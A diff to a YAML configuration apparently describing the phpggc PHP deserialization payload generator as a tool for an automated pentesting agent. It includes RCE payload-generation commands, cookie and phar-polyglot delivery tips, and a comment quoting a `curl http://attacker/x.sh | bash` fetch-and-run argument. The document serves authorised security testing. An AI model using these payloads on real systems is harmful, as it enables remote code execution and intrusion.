@@ -1,17 +1,75 @@
 name: phpggc
+kind: cli
+binary: phpggc
 version: "1.0"
-description: "PHP Generic Gadget Chains — generates serialized PHP payloads for deserialization attacks via phpggc. 3 methods: list_gadgets (list all chains filterable by framework — Symfony, Laravel, Monolog, Doctrine, Drupal, WordPress, Magento, Guzzle, etc.), get_info (detailed info on a specific chain), generate (create serialized payload with encoding options: base64, URL-encode, JSON, PHAR wrapper, fast-destruct). For .NET deserialization use ysoserial. For exploit execution use exploit-runner."
+description: "PHP Generic Gadget Chains — generates serialized PHP payloads for unserialize() / phar:// deserialization attacks across ~100+ gadget chains spanning 14+ frameworks (Symfony, Laravel, Monolog, Doctrine, Drupal, WordPress, Magento, Guzzle, Phalcon, Yii, CodeIgniter, etc.). Operates ENTIRELY OFFLINE — there is no network target. The agent supplies a CHAIN name (`<Framework>/RCE<n>` or `/FW<n>`/`/FD<n>`/`/FR<n>` for file write/delete/read), positional ARGUMENTS the chain expects (typically a function + command for RCE; src/dst paths for file write), and an optional output ENCODING (`-b` base64, `-u` URL-encode, `-j` JSON, `-s` soft-URL for cookies) or wrapper (`--phar` polyglot). phpggc returns the serialized payload to stdout. NOTE: this is the PHP fork; for .NET deserialization use ysoserial; for Java use exploit-runner with ysoserial-java."
 image: "ghcr.io/silicon-works/mcp-tools-phpggc:latest"
 image_size_mb: 300
-timeout_seconds: 60
+# Dual-clock model:
+#   idle_timeout_seconds — silence between MCP heartbeats. phpggc payload
+#     generation is fast (sub-second to a few seconds for most chains);
+#     60s silent = stuck (e.g., -t mode hung in local deserialize, --phar
+#     wrapper writing to disk on a slow mount, gadget search blowing past
+#     the chain table without -f).
+#   max_runtime_seconds  — hard wall-clock cap; never resets on heartbeat.
+#     5 min covers `-t` (which actually deserializes locally), `-l` over
+#     the full chain table on cold disk, and large `--phar` polyglot
+#     builds.
+# Legacy `timeout_seconds` is used by older clients as the hard cap.
+idle_timeout_seconds: 60
+max_runtime_seconds: 300
+timeout_seconds: 300
 
 capabilities:
   - php_deserialization
   - gadget_chain_generation
   - phar_creation
+  - payload_creation
 
 phases:
   - exploitation
+
+routing:
+  use_for:
+    - "generate PHP deserialization payloads for unserialize() vulnerabilities"
+    - "create gadget chains for Symfony, Laravel, Monolog, Doctrine, Drupal, WordPress, Magento, Guzzle, Phalcon"
+    - "exploit PHP deserialization via phar:// wrapper (PHAR polyglot payloads, e.g., JPG-PHAR upload)"
+    - "list available PHP gadget chains and filter by framework / CVE"
+    - "build base64 / URL-encoded / JSON / soft-URL PHP payloads with embedded function+command"
+  never_use_for:
+    - task: ".NET deserialization payloads"
+      use_instead: "ysoserial"
+      reason: "ysoserial.net generates serialized .NET payloads (BinaryFormatter / Json.Net / LosFormatter / SoapFormatter etc.). Different format, gadget set, binary."
+    - task: "Java deserialization payloads"
+      use_instead: "exploit-runner with ysoserial-java jar"
+      reason: "Java ysoserial generates Java serialized objects (CommonsCollections, URLDNS, Hibernate, JRMPClient, etc.). Different format."
+    - task: "Delivering / running the payload"
+      use_instead: "curl, exploit-runner"
+      reason: "phpggc only GENERATES the serialized bytes. Delivery (cookie injection, POST body, phar upload, session injection) is a separate step via curl or exploit-runner."
+    - task: "Web vulnerability scanning or detection"
+      use_instead: "nuclei, sqlmap, ssti, nikto"
+      reason: "phpggc does not fingerprint, scan, or detect — it only generates payloads after a human or another tool has confirmed the deserialization sink."
+    - task: "PHP source-code analysis to find unserialize() sinks"
+      use_instead: "manual / grep / static-analysis tooling"
+      reason: "phpggc is the exploitation step. Identifying that a target calls unserialize() on attacker-controlled input is upstream of phpggc."
+  triggers:
+    - "phpggc"
+    - "PHP deserialization"
+    - "unserialize"
+    - "gadget chain"
+    - "PHP gadget"
+    - "phar deserialization"
+    - "phar://"
+    - "Monolog RCE"
+    - "Symfony RCE"
+    - "Laravel RCE"
+    - "Drupal RCE"
+    - "WordPress RCE"
+    - "Magento RCE"
+    - "Guzzle RCE"
+    - "Doctrine RCE"
+    - "insecure deserialization PHP"
+  prefer_over: []
 
 requirements:
   network: false
@@ -21,101 +79,236 @@ resources:
   memory_mb: 128
   cpu: 0.25
 
-routing:
-  use_for:
-    - "generate PHP deserialization payloads for unserialize() vulnerabilities"
-    - "create gadget chains for Symfony, Laravel, Monolog, Doctrine, Drupal, WordPress, Guzzle"
-    - "exploit PHP deserialization via phar:// wrapper (PHAR polyglot payloads)"
-    - "list available gadget chains for a specific PHP framework"
-    - "generate serialized PHP objects with various encodings (base64, URL-encode)"
-  never_use_for:
-    - ".NET deserialization (use ysoserial)"
-    - "Java deserialization (use exploit-runner with ysoserial-java)"
-    - "running exploits (use exploit-runner — phpggc only generates the payload)"
-    - "web scanning or vulnerability detection (use nuclei, sqlmap, ssti)"
-  triggers:
-    - phpggc
-    - PHP deserialization
-    - unserialize
-    - gadget chain
-    - PHP gadget
-    - phar deserialization
-    - Monolog RCE
-    - Symfony RCE
-    - Laravel RCE
-  prefer_over: []
-
 see_also:
   - tool: ysoserial
-    reason: phpggc is for PHP deserialization. ysoserial is for .NET deserialization. Different language ecosystems.
+    reason: "phpggc is for PHP deserialization. ysoserial is for .NET deserialization. Different language ecosystems."
   - tool: exploit-runner
-    reason: phpggc generates the serialized payload. Use exploit-runner or curl to deliver it to the target.
+    reason: "phpggc generates the serialized PHP payload; use exploit-runner (or curl) to deliver it to the target — cookie injection, POST body, phar upload, session injection, etc."
+  - tool: curl
+    reason: "Use phpggc to build the payload, then curl to deliver it (e.g., as a base64-URL-encoded cookie, JSON body, or multipart upload of a phar polyglot)."
   - tool: ssti
-    reason: Both exploit PHP applications but different vulnerability classes — SSTI injects template code, phpggc exploits insecure deserialization.
+    reason: "Both target PHP applications, but different vulnerability classes — SSTI injects template syntax (Twig / Smarty), phpggc exploits insecure deserialization sinks. Choose based on the confirmed sink type."
 
-methods:
-  list_gadgets:
-    description: "List all available PHP gadget chains, optionally filtered by framework name. Returns chain name, affected versions, type (RCE/file write/file delete/etc.), and trigger vector (__destruct/__wakeup/__toString)."
-    when_to_use: "First step after confirming PHP deserialization — check which gadget chains are available for the target framework. Filter by framework name (e.g., 'symfony', 'laravel', 'monolog') to see only relevant chains."
-    params:
-      filter:
-        type: string
-        description: "Filter by framework name (e.g., 'symfony', 'laravel', 'monolog', 'drupal', 'wordpress', 'guzzle')."
-    returns:
-      chains:
-        type: array
-        description: "Available chains, each with: name, version, type, vector."
-      chain_count:
-        type: integer
-        description: "Total number of matching chains."
-      frameworks:
-        type: array
-        description: "Unique framework names found."
+# ── kind:cli specific sections ──────────────────────────────────────
 
-  get_info:
-    description: "Get detailed information about a specific gadget chain — required arguments, affected versions, and usage notes."
-    when_to_use: "Before generating a payload — understand what arguments the chain needs and which versions it supports."
-    params:
-      chain:
-        type: string
-        required: true
-        description: "Gadget chain name (e.g., 'Monolog/RCE1', 'Symfony/RCE4', 'Laravel/RCE1')."
-    returns:
-      info:
-        type: string
-        description: "Detailed chain information (arguments, versions, notes)."
+target_extraction:
+  # phpggc has NO network target. Its operation is purely local gadget-
+  # chain serialization: a CHAIN name (e.g., `Laravel/RCE1`), positional
+  # ARGUMENTS the chain expects (typically a PHP function + an OS-level
+  # argument string), and an optional output ENCODING flag. None of these
+  # are network endpoints in the OpenSploit sense:
+  #   - chain names are KEYWORDS (Laravel/RCE1, Symfony/RCE4, Monolog/RCE1, ...)
+  #   - chain arguments are STRINGS interpreted by the chain's gadgets
+  #     (e.g., for an RCE chain, ['system', 'id'] means "call PHP's
+  #     system() with arg 'id' when the gadget fires"). The argument
+  #     MAY contain a host/IP/URL — but that's an attacker-callback
+  #     endpoint inside the embedded command, NOT a target phpggc is
+  #     attacking.
+  #   - output flags (-b / -u / -j / -s / --phar) select the wire
+  #     encoding, not a destination.
+  #
+  # Decision: declare NO target_extraction rules. The plugin extracts
+  # target=null. The downstream gotcha note explains that scope-validation
+  # is N/A for phpggc because the operation is purely local payload
+  # generation. Same shape as ysoserial / ilspy / john / hashcat /
+  # volatility / searchsploit.
+  #
+  # An IP-shaped or URL-shaped string inside chain arguments (e.g.,
+  # `Laravel/RCE1 system "curl http://attacker/x.sh | bash"`) should NOT
+  # be auto-extracted as a target. See open question #1 in scenarios.md
+  # for engagement-scope handling of attacker-callback endpoints.
+  []
 
-  generate:
-    description: "Generate a serialized PHP payload for a specific gadget chain. The payload can be delivered via any mechanism that triggers unserialize() — cookie values, POST parameters, file uploads, session data, or phar:// wrapper."
-    when_to_use: "After identifying the target framework and selecting a chain from list_gadgets. For RCE chains, arguments are typically [function, command] (e.g., ['system', 'id']). For file write chains, arguments are [remote_path, local_path]. Use base64 encoding for safe transport in URLs/cookies."
-    params:
-      chain:
-        type: string
-        required: true
-        description: "Gadget chain name (e.g., 'Monolog/RCE1')."
-      arguments:
-        type: array
-        required: true
-        description: "Chain arguments (e.g., ['system', 'id'] for RCE, ['/var/www/shell.php', '/tmp/shell.php'] for file write)."
-      encoding:
-        type: string
-        default: "none"
-        description: "Output encoding: none (raw serialized), base64, url, soft-url, json."
-      fast_destruct:
-        type: boolean
-        default: false
-        description: "Fast-destruct technique — triggers immediately after unserialize() instead of at script end."
-      ascii_strings:
-        type: boolean
-        default: false
-        description: "Replace non-ASCII bytes with hex (experimental, avoids null bytes)."
-      phar:
-        type: string
-        description: "Generate PHAR file (tar/zip/phar format) for phar:// wrapper attacks."
-    returns:
-      payload:
-        type: string
-        description: "The serialized PHP payload (ready to deliver)."
-      payload_length:
-        type: integer
-        description: "Payload length in characters."
+# phpggc has no target-list flag analog. The operands are a chain
+# KEYWORD and positional argument STRINGS plus encoding/output flags.
+# Wordlists, target files, and scope references don't apply.
+reject_flags: []
+reject_flags_reason: "phpggc has no network target and no target-list flag. Its operands are a chain KEYWORD (positional, e.g., `Laravel/RCE1`) and chain-specific argument STRINGS (e.g., `system whoami`). The IP / URL / hostname embedded inside an argument is the ATTACKER-CALLBACK endpoint that fires when the target deserializes — NOT a target phpggc itself attacks. There is no scope-validation surface to protect at the phpggc layer."
+
+# Per-tool value-taking flags. Verified against `phpggc --help` (v1.0,
+# upstream master). phpggc uses a mix of single-dash short flags (`-l`,
+# `-i`, `-o`, `-w`, `-cve`, `-n`, `-b`, `-u`, `-j`, `-s`, `-t`, `-f`,
+# `-a`, `-h`) plus a few long flags (`--phar`, `--help`).
+value_flags:
+  # Value-taking flags (next argv is the value):
+  - "-i"          # info on a specific chain — value is chain name (e.g., `-i Laravel/RCE1`)
+  - "-o"          # output to file path — value is filesystem path
+  - "-w"          # wrap output with a wrapper file (e.g., php_wrapper.txt) — value is wrapper path
+  - "-cve"        # filter chain list by CVE — value is CVE id (e.g., `-cve CVE-2018-15133`)
+  - "-n"          # filter chain list by name pattern — value is regex / substring
+  - "--phar"      # phar polyglot extension/format — value is one of (jpg | gif | tar | zip | phar)
+  - "-pj"         # phar-jpeg overlay — value is a path to an EXISTING jpeg file to overlay the phar onto (distinct from `--phar jpg` which builds the polyglot from scratch)
+  # Boolean / no-value flags — listed for completeness so they are NOT
+  # mis-parsed as taking the next argv as a value.
+  - "-l"          # list chains (boolean)
+  - "-b"          # base64 encode output (boolean)
+  - "-u"          # URL-encode output (boolean)
+  - "-j"          # JSON output (boolean)
+  - "-s"          # soft URL-encode (cookie-safe) (boolean)
+  - "-t"          # test — locally deserialize generated payload (boolean, dangerous; runs the embedded code on the container)
+  - "-f"          # fast — skip phar polyglot probing during gadget search (boolean)
+  - "-a"          # ASCII-strings — replace non-ASCII bytes with hex (boolean, experimental)
+  - "-h"          # help (boolean)
+  - "--help"      # long form (boolean)
+
+usage_patterns:
+  - name: "List all chains (smoke test + discovery)"
+    command: "phpggc -l"
+    when: "First-call smoke test. Prints the full chain table — each row is `<Framework>/<Type><n>  <Versions>  <Type>  <Vector>  *` (the trailing `*` marks chains that have detailed `-i` info available). Use to confirm the binary is on PATH and the bundled chain library is intact. ALSO use as the canonical discovery step: scan the table for chains matching the target's stack (e.g., look for `Laravel/RCE*` or `Symfony/RCE*` rows after fingerprinting the target framework)."
+
+  - name: "Filter chains by framework name"
+    command: "phpggc -l -n WordPress"
+    when: "Narrow the chain list to a specific framework or CMS. `-n` accepts a substring/regex matched against the chain NAME column; `WordPress` matches `WordPress/RCE1`, `WordPress/RCE2`, etc. Use after fingerprinting the target (web-fingerprint, nuclei, manual recon) to enumerate candidate chains. Combine with `-cve <CVE-ID>` to filter by published CVE."
+
+  - name: "Get info on a specific chain"
+    command: "phpggc -i Laravel/RCE1"
+    when: "Before generating a payload, run `-i` to see the chain's required positional ARGUMENTS, affected version range, vulnerable component, vector (`__destruct` / `__wakeup` / `__toString`), and any author / CVE notes. Critical for RCE chains where argument count and ordering vary (e.g., `system <cmd>` vs `passthru <cmd>` vs `<remote_path> <local_path>` for file-write chains)."
+
+  - name: "Generate a Laravel RCE payload (canonical RCE smoke test)"
+    command: "phpggc Laravel/RCE1 system whoami"
+    when: "Canonical PHP deserialization smoke test once a Laravel target is confirmed. `Laravel/RCE1` is one of the most widely tested chains; the chain takes two positional args after the chain name — a PHP function (`system`, `passthru`, `exec`, `shell_exec`) and the command string the function gets called with. Output is a RAW serialized PHP object on stdout (`O:N:\"ClassName\":...`) — usually piped to a file via `-o` or further encoded for transport via `-b -u`. NOTE: chain names are CASE-SENSITIVE (`Laravel/RCE1`, NOT `laravel/rce1`)."
+
+  - name: "Base64 + URL-encoded payload for HTTP transport"
+    command: "phpggc Laravel/RCE1 system whoami -b -u"
+    when: "The canonical chain for HTTP-injectable payloads. `-b` first base64-encodes the raw serialized bytes (printable, no null bytes), then `-u` URL-encodes the result so it survives query string / cookie / form-data transport. The receiver does the inverse: URL-decode, base64-decode, then `unserialize()`. This is the most common phpggc invocation in published PHP deserialization PoCs. For cookie values consider `-s` (soft URL-encode) instead of `-u` to avoid double-encoding by the browser."
+
+  - name: "JSON output for REST API exploitation"
+    command: "phpggc Symfony/RCE4 system id -j"
+    when: "When the deserialization sink reads a JSON-wrapped payload (e.g., a REST API endpoint passing the JSON body to `unserialize()` after JSON decode). `-j` emits the serialized bytes inside a JSON envelope ready to splice into a JSON request body. Pair with `-b` if the JSON parser doesn't tolerate raw serialized PHP control characters."
+
+  - name: "Phar polyglot — JPG + PHAR for file-upload deserialization (phar:// wrapper)"
+    command: "phpggc Symfony/RCE4 system id --phar jpg -o /session/payload.jpg"
+    when: "When the target accepts file uploads (image upload, document upload) AND the application later passes a user-controlled path to a function vulnerable to phar:// (`file_exists`, `is_file`, `filesize`, `getimagesize`, `imagecreatefromstring`). `--phar jpg` builds a polyglot file: valid JPEG header at the front, phar archive at the back. Upload as `payload.jpg`, then trigger phar:// deserialization via a path like `phar://uploads/payload.jpg`. Use `-o` to write directly to /session so subsequent curl/exploit-runner calls can read the file."
+
+  - name: "Output to file (avoids stdout-pipe limitations)"
+    command: "phpggc Monolog/RCE1 system id -b -u -o /session/payload.b64"
+    when: "Write the encoded payload directly to a file in the persistent /session mount. Useful because (a) cli_in_container has no shell, so `phpggc ... > /session/x` won't work; (b) the agent needs a stable path to feed into the next step (curl POST body, exploit-runner script, etc.). `-o <path>` is phpggc's native file-output flag."
+
+  - name: "Filter list by CVE"
+    command: "phpggc -l -cve CVE-2018-15133"
+    when: "When the target has a known vulnerable component (often surfaced from web-fingerprint, nuclei, or external CVE intel) but you don't yet know which phpggc chain corresponds. `-cve <CVE-ID>` filters the chain table to chains tagged with that CVE — e.g., `CVE-2018-15133` (Laravel deserialization) maps to `Laravel/RCE1`. Combine with `-n` to further narrow."
+
+  - name: "Verify gadget actually fires (-t, dangerous)"
+    command: "phpggc Laravel/RCE1 system whoami -t"
+    when: "WARNING: -t ACTUALLY DESERIALIZES the generated payload locally to verify the gadget fires (i.e., literally calls `system whoami` on the CONTAINER running phpggc). Use to validate gadget compatibility BEFORE shipping the payload to the target. Pick benign commands (`whoami`, `id`); never run -t with destructive commands or reverse shells (the shell would connect FROM the container, not the target)."
+
+output_formats:
+  # phpggc's "output" is the serialized payload itself, NOT a tabular
+  # result. The agent picks the wire encoding via flags.
+  - flag: "(none)"
+    format: "raw_php_serialized"
+    preferred: false  # raw bytes — usually piped via -o or further encoded
+  - flag: "-b"
+    format: "base64"
+    preferred: true   # printable, safe for HTTP / JSON contexts
+  - flag: "-u"
+    format: "url_encoded"
+    preferred: false  # use AFTER -b (so chain is `-b -u`) for HTTP transport
+  - flag: "-b -u"
+    format: "base64_url_encoded"
+    preferred: true   # canonical chain for cookie / query / form-data delivery
+  - flag: "-s"
+    format: "soft_url_encoded"
+    preferred: false  # cookie-safe (avoids double-encoding)
+  - flag: "-j"
+    format: "json"
+    preferred: false  # JSON-wrapped — for REST API sinks
+  - flag: "--phar jpg"
+    format: "phar_polyglot_jpg"
+    preferred: false  # binary file — capture via -o /session/<file>.jpg
+  - flag: "--phar gif"
+    format: "phar_polyglot_gif"
+    preferred: false
+  - flag: "--phar tar"
+    format: "phar_tar"
+    preferred: false
+  - flag: "--phar zip"
+    format: "phar_zip"
+    preferred: false
+  - flag: "--phar phar"
+    format: "phar_native"
+    preferred: false
+
+common_options:
+  chain:
+    - "<Framework>/<Type><N> (positional, REQUIRED): the gadget chain selector. Format is `<Framework>/<Code>` where Framework is e.g. `Laravel`, `Symfony`, `Monolog`, `Doctrine`, `Drupal`, `WordPress`, `Magento`, `Guzzle`, `Phalcon`, `Yii`, `CodeIgniter`, `SwiftMailer`, `SlimPHP`, `Phing`, etc., and Code is `RCE<n>` (remote code execution), `FW<n>` (file write), `FD<n>` (file delete), `FR<n>` (file read), `INFO<n>` (information disclosure), or `SQLI<n>` (SQL injection). CASE-SENSITIVE — `Laravel/RCE1` works; `laravel/rce1` does NOT. Discover via `phpggc -l` (full table) or `phpggc -l -n <pattern>` (filtered)."
+  command-args:
+    - "<chain-args> (positionals after the chain name, REQUIRED count and meaning vary by chain): per `phpggc -i <chain>`. RCE chains typically take TWO args — a PHP function (`system`, `passthru`, `exec`, `shell_exec`) and the command string. File-write chains take TWO paths — `<remote_dest>` and `<local_src>`. File-read / file-delete chains take ONE path. Some chains have unusual signatures (e.g., a callable + args). ALWAYS run `-i <chain>` first when the chain is unfamiliar."
+  encoding:
+    - "-b: base64 encode the raw serialized bytes. Produces a printable string (~33% larger than raw); the canonical first encoding step for HTTP-transportable payloads."
+    - "-u: URL-encode the bytes. Use AFTER -b for cookie / query-string transport (the standard chain is `-b -u`). The receiver URL-decodes then base64-decodes."
+    - "-s: soft URL-encode. Like -u but only encodes characters that are unsafe in cookie values (whitespace, semicolons, control chars) — leaves `+`, `/`, `=` alone. Use for Cookie: header injection where browser auto-encoding would double-up on full -u."
+    - "-j: JSON output. Wraps the (raw or encoded) payload in a JSON envelope — useful when the deserialization sink reads JSON-decoded input."
+  output:
+    - "-o <path>: write the (encoded) payload to a file at <path> instead of stdout. Critical because cli_in_container has no shell — `>` redirection doesn't work. Use a /session/ path so subsequent curl / exploit-runner calls can read the file."
+  polyglot:
+    - "--phar <ext>: build a phar polyglot file FROM SCRATCH. <ext> is one of `jpg`, `gif`, `tar`, `zip`, `phar`. The output is a binary file with the requested wrapper format (e.g., a valid JPEG that's also a phar archive); upload to the target's file-upload endpoint, then trigger phar:// deserialization via a vulnerable function call. ALWAYS combine with `-o <path>` — binary phar files won't survive stdout JSON encoding."
+    - "-pj <jpeg-path>: phar-jpeg OVERLAY mode — embed the phar archive into an EXISTING JPEG file at <jpeg-path>. Distinct from `--phar jpg` (which synthesizes a minimal valid JPEG header). Use `-pj` when the target's image-upload endpoint validates richer JPEG metadata (EXIF, dimensions, real image content) that phpggc's synthetic header doesn't satisfy — supply a real JPEG and phpggc appends the phar bytes after the JPEG end-of-image marker. Always pair with `-o <output-path>`."
+    - "-w <wrapper-file>: wrap the output with a custom PHP wrapper (typically `templates/wrapper/php_wrapper.txt` from the phpggc tree). Used to embed the serialized payload inside a `<?php ... unserialize(...) ?>` shim for testing or for sinks that expect PHP source instead of raw serialized bytes."
+  discovery:
+    - "-l: list ALL chains. The first command to run when unfamiliar with phpggc's chain library."
+    - "-l -n <pattern>: filter the chain list by name pattern (substring/regex match against the `<Framework>/<Code>` column). E.g., `-l -n WordPress` shows all WordPress chains; `-l -n RCE` shows all RCE chains across frameworks."
+    - "-l -cve <CVE-ID>: filter the chain list by associated CVE (e.g., `-cve CVE-2018-15133`). Useful when external intel surfaced a CVE but the chain mapping isn't obvious."
+    - "-i <chain>: print detailed info on one chain — required arguments, affected versions, vulnerable component, gadget vector. Run BEFORE generating to confirm the chain accepts the arguments you intend to pass."
+  modifiers:
+    - "-t: test mode — phpggc generates the payload AND deserializes it locally on the container to verify the gadget fires. Use for compatibility verification with benign commands; NEVER with destructive `-c` strings or reverse shells (would fire FROM the container, not the target)."
+    - "-f: fast — skip phar polyglot probing during gadget search; speeds up `-l` runs at the cost of not discovering some phar-only chains. Useful in CI."
+    - "-a: ASCII-strings — replace non-ASCII bytes in the serialized output with hex escapes (`\\x42` style). Experimental; avoids null bytes and high-bit chars that some sinks reject (e.g., a `unserialize()` after a `htmlspecialchars()` filter)."
+
+gotchas:
+  - "phpggc has NO NETWORK TARGET. Its operands are a chain keyword (e.g., `Laravel/RCE1`) and chain-specific positional argument strings (e.g., `system whoami`). The IP / URL embedded inside an argument is an ATTACKER-CALLBACK endpoint that fires when the target deserializes — NOT a target phpggc itself attacks. target_extraction returns null; scope-validation is N/A. Same shape as ysoserial / ilspy / john / hashcat / volatility / searchsploit."
+  - "Output is RAW PHP SERIALIZED OBJECT by default — a string like `O:8:\"stdClass\":1:{...}` containing null bytes, control chars, and high-bit bytes. WILL break a JSON-wrapped MCP response if printed unencoded. ALWAYS use `-b` (base64) or `-b -u` (base64 + URL-encode) for stdout capture; reserve raw for `-o /session/<file>` redirection."
+  - "`-b -u` is the CANONICAL chain for HTTP-injectable payloads — base64 first (avoid null bytes / high-bit chars), then URL-encode (avoid `+`, `/`, `=` getting reinterpreted). Receiver does the inverse: URL-decode then base64-decode then `unserialize()`. For cookie values consider `-s` (soft URL-encode) instead of `-u` to avoid double-encoding by browsers."
+  - "Chain names are CASE-SENSITIVE. `Laravel/RCE1` is correct; `laravel/rce1`, `LARAVEL/RCE1`, `Laravel/rce1` will all fail with `Unknown gadget chain` (or similar). The framework name is PascalCase, the code is uppercase + digit (RCE1, FW1, FD2, INFO1, SQLI1)."
+  - "Use `-l` to discover chains; `-i <chain>` for info on a specific one. RCE chain ARGUMENTS vary — most take a PHP function name + a command string (`system whoami`), some take three positionals, file-write chains take src+dst paths. ALWAYS run `-i` when the chain is unfamiliar; don't guess the argument signature."
+  - "`--phar <ext>` builds a POLYGLOT file (e.g., a JPEG that's also a phar archive). The output is BINARY — null bytes, control chars, headers — and MUST be captured via `-o <path>` (phpggc's native file-output flag). Stdout capture in cli_in_container would mangle the bytes via JSON encoding."
+  - "`-pj <jpeg-path>` is DISTINCT from `--phar jpg`. `--phar jpg` SYNTHESIZES a minimal JPEG header from scratch (small file, may fail strict image validators). `-pj <existing.jpg>` OVERLAYS the phar bytes onto a REAL pre-existing JPEG you supply at <jpeg-path> — use this when the upload endpoint validates EXIF / real dimensions / actual image content. Both require `-o <output-path>` for the polyglot file."
+  - "STDOUT-PIPE GOTCHA: cli_in_container uses subprocess spawn with NO shell. A command like `phpggc Laravel/RCE1 system whoami | base64` will NOT work — the shell metachar `|` is passed as a literal positional arg to phpggc (which rejects it). To get base64, use `-b` directly. To save to a file, use `-o <path>` (NOT `>` redirection)."
+  - "`-o` is an OUTPUT PATH (where to write the payload), NOT an output FORMAT selector. Different from john / nuclei / nikto where `-o` is a file path AND from ysoserial where `-o` is a format keyword. To select encoding, use `-b` / `-u` / `-j` / `-s`."
+  - "phar:// wrapper attacks require TWO target-side prerequisites: (1) the application accepts file uploads or otherwise places attacker-controlled bytes on disk, AND (2) the application later passes an attacker-controlled path to a function that triggers phar deserialization (`file_exists`, `is_file`, `filesize`, `getimagesize`, `imagecreatefromstring`, `fopen` with `phar://` scheme). Without BOTH, generating a `--phar` polyglot is wasted effort."
+  - "`-t` ACTUALLY EXECUTES the embedded function call on the CONTAINER running phpggc — it deserializes the payload locally to verify the gadget fires. Use only with benign commands (`whoami`, `id`); never with `rm -rf /`, reverse shells back to attacker infrastructure, or anything destructive. The `-t` reverse shell would connect FROM the container, not from the target — wrong source IP, may contaminate logs."
+  - "`-f` (fast) skips phar polyglot probing during chain search — speeds up `-l` significantly but misses some phar-only chains. Use for CI / interactive listing; omit when comprehensiveness matters."
+  - "`-a` (ASCII-strings) replaces non-ASCII bytes with hex escapes (`\\x42` style). Experimental and only useful when the target sink filters non-ASCII or null bytes (e.g., a `unserialize()` call wrapped by a `htmlspecialchars()` or `addslashes()` upstream). Most sinks accept binary; default off."
+  - "PHP version mismatch. Some chains require specific PHP versions on the TARGET (the gadget classes' constructor / __destruct semantics changed across PHP 5/7/8). Run `-i <chain>` to see the affected version range; if the target is outside the range, the gadget may fail silently (no RCE) or throw a Fatal error in PHP logs."
+  - "Chain selection hierarchy. Prefer chains matching the target's confirmed framework + version. Fall back to FRAMEWORK-AGNOSTIC chains (e.g., `Monolog/RCE*` works whenever the target loads Monolog as a logging dependency, regardless of the host framework). Avoid SPECULATIVE chains — generating a payload for a framework the target doesn't run is wasted effort."
+
+failure_signatures:
+  # Layer-diverse signals (SKILL #11):
+  #   - Chain layer (unknown chain name; chain not in library)
+  #   - Argument layer (chain expects N args, got M; missing required arg)
+  #   - PHP runtime layer (Fatal error during chain reflection — rare)
+  #   - File / I/O layer (-o write fails; --phar build fails)
+  #   - Phar layer (phar wrapper extension invalid; build error)
+  #   - Help / usage fallback (bare invocation, wrong args print usage)
+  - signal: "Unknown gadget chain"
+    remediation: "The chain name passed as the first positional doesn't match anything in the bundled chain library. Run `phpggc -l` for the full list, or `phpggc -l -n <substring>` to filter. Names are CASE-SENSITIVE — `Laravel/RCE1` not `laravel/rce1`."
+  - signal: "Chain not found"
+    remediation: "Alternate phrasing for unknown chain. Same fix — verify spelling and case via `phpggc -l`."
+  - signal: "Usage:"
+    remediation: "phpggc printed its usage banner — usually because no args were given, the chain name was missing, or argparse couldn't parse the supplied flags. Re-construct as `phpggc <Framework>/<Code> <chain-args> [<encoding-flags>]`. Run `phpggc -i <chain>` to confirm the chain's expected positional argument count and order."
+  - signal: "Required argument"
+    remediation: "Missing a required positional after the chain name. Most RCE chains require TWO positionals (a PHP function name + a command string). Run `phpggc -i <chain>` to see the chain's exact argument signature."
+  - signal: "Could not write"
+    remediation: "`-o <path>` failed to write the output file. Verify the path is inside the writable /session/ mount (other paths in the container may be read-only) and the directory exists. Avoid relative paths — use absolute /session/<file>."
+  - signal: "Permission denied"
+    remediation: "Filesystem permission failure on `-o <path>` or `--phar` output. Use a /session/ path; container's WORKDIR (/app) is writable but ephemeral — /session/ is the canonical persistent mount."
+  - signal: "Phar wrapper failed"
+    remediation: "`--phar <ext>` build error — usually the extension keyword is wrong. Valid values: `jpg`, `gif`, `tar`, `zip`, `phar`. Other extensions (e.g., `png`, `pdf`) aren't supported by phpggc's polyglot builder."
+  - signal: "Could not create phar"
+    remediation: "Phar build failed at the PHP runtime level — usually because the container's php-cli has phar.readonly=1 set in php.ini. Verify with `php -i | grep phar.readonly`; if 1, the image build is broken (Dockerfile should ensure phar.readonly=Off or unset)."
+  - signal: "Fatal error: Uncaught Error"
+    remediation: "PHP CLI threw a Fatal error during chain reflection — rare. Usually means the bundled phpggc clone is corrupt or a chain references a missing PHP extension. Re-pull the image; if reproducible, file a bug against ambionics/phpggc upstream."
+  - signal: "command not found"
+    remediation: "The `phpggc` symlink isn't on PATH. The image installs `/usr/local/bin/phpggc` (a symlink to `/opt/phpggc/phpggc`). If missing, the container build is broken — rebuild from the Dockerfile."
+  - signal: "Unknown option"
+    remediation: "phpggc rejected an unknown flag. Common causes: confusing single-dash and double-dash forms (e.g., `--cve` instead of `-cve` — phpggc uses single-dash for `-cve`). Run `phpggc -h` for the full flag list."
+  - signal: "syntax error"
+    remediation: "PHP CLI parse error — the bundled phpggc tree is corrupt. Re-pull the image. If persistent, verify `/opt/phpggc/phpggc` and `/opt/phpggc/lib/` exist and are non-empty."
+
+help_commands:
+  - command: "phpggc -h"
+    purpose: "Top-level help — prints the full usage and flag list. ALSO use as a targetless smoke test that PHP CLI and the bundled phpggc tree are functional."
+  - command: "phpggc --help"
+    purpose: "Long form of -h — same output."
+  - command: "phpggc -l"
+    purpose: "List all available chains in a tabular format. Use as the canonical discovery step (combine with `-n` for substring filter or `-cve` for CVE filter). Also exercises the bundled chain-library load path."
